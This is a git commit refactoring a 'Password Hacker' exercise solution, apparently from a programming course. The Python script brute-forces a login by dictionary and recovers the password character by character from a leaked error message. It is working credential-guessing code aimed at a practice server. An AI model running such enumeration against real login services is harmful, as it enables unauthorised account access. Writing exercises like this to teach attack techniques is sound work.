e557bba650016975389eb70d911719a48098f859
Dan Murphy <70486892+tusktenon@users.noreply.github.com>
2026-02-16 08:45:27 -0500

    Password Hacker: refactor Stage 4 solution

--- PasswordHacker/hack4.py
+++ PasswordHacker/hack4.py
@@ -12,12 +12,16 @@ def dictionary_generator(login_list):
             yield ''.join(variant)
 
 
+def get_result(client_socket, login, password):
+    req = json.dumps({'login': login, 'password': password})
+    client_socket.sendall(req.encode())
+    res = json.loads(client_socket.recv(1024).decode())
+    return res['result']
+
+
 def find_login(client_socket, login_list):
     for candidate in dictionary_generator(login_list):
-        req = json.dumps({'login': candidate, 'password': 'pass'})
-        client_socket.sendall(req.encode())
-        res = json.loads(client_socket.recv(1024).decode())
-        if res['result'] != 'Wrong login!':
+        if get_result(client_socket, candidate, 'pass') != 'Wrong login!':
             return candidate
     return None
 
@@ -27,14 +31,12 @@ def find_password(client_socket, login):
     while True:
         for c in ascii_letters + digits:
             candidate = password + c
-            req = json.dumps({'login': login, 'password': candidate})
-            client_socket.sendall(req.encode())
-            res = json.loads(client_socket.recv(1024).decode())
-            if (result := res['result']) == 'Exception happened during login':
+            result = get_result(client_socket, login, candidate)
+            if result == 'Exception happened during login':
                 password = candidate
                 break
             elif result == 'Connection success!':
-                return req
+                return candidate
 
 
 def main():
@@ -45,7 +47,8 @@ def main():
     with socket() as client:
         client.connect(address)
         login = find_login(client, login_list)
-        print(find_password(client, login))
+        password = find_password(client, login)
+        print(json.dumps({'login': login, 'password': password}, indent=4))
 
 
 if __name__ == '__main__':
